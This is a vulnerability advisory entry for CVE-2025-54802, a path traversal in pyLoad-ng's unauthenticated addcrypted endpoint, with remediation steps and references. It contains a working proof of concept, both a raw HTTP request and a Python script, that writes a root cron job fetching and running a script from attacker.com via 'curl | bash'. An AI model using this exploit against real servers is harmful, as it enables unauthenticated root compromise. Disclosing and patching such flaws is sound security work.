info:
  name: pyload-ng
  cve: CVE-2025-54802
  summary: Path Traversal in pyLoad-ng CNL Blueprint via `package` parameter allows Arbitrary File Write leading to Remote Code Execution (RCE).
  details: |
    The `addcrypted` endpoint in `pyload-ng` suffers from an unsafe path construction vulnerability, allowing unauthenticated attackers to write arbitrary files outside the designated storage directory. This can be abused to overwrite critical system files, including cron jobs and systemd services, leading to privilege escalation and remote code execution as root.
    **Endpoint**: `POST /addcrypted`
    **Issue**: `src/pyload/webui/app/blueprints/cnl_blueprint.py`
    #### Vulnerable Code
    ```python
     dlc_path = os.path.join(
         dl_path, package.replace("/", "").replace("\\", "").replace(":", "") + ".dlc"
     )
     dlc = flask.request.form["crypted"].replace(" ", "+")
     with open(dlc_path, mode="wb") as fp:
    ```
    #### PoC
    ```http
    POST /addcrypted HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 107
    package=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==
    ```
    Decoded payload:
    ```bash
    * * * * * root curl -s http://attacker.com/r.sh | bash
    ```
    **Send crafted POST**
    ```python
    import requests, base64
    payload = "* * * * * root curl http://attacker.com/rev.sh | bash"
    b64 = base64.b64encode(payload.encode()).decode()
    requests.post("http://localhost:8000/addcrypted", data={
        "package": "../../../../etc/cron.d/exploit",
        "crypted": b64
    })
    ```
    The vulnerability allows unauthenticated attackers to write arbitrary files outside the intended directory via a path traversal flaw in the `addcrypted` endpoint in `pyload-ng` parameter. When exploited, it enables remote code execution as **root** by injecting malicious cron jobs or system files, turning a simple file upload endpoint into a full system compromise vector.
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. Upgrade to version `0.5.0b3.dev90` or later.
    2. Apply the patch from commit `70a44fe02c03bce92337b5d370d2a45caa4de3d4` if an upgrade is not immediately possible.
    3. Implement strict input validation and sanitization for the `package` parameter to prevent directory traversal characters.
    4. Ensure that file write operations are restricted to designated, non-sensitive directories.
rule: version < "0.5.0b3.dev90"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54802
  - https://github.com/pyload/pyload/pull/4596
  - https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4
  - https://github.com/pyload/pyload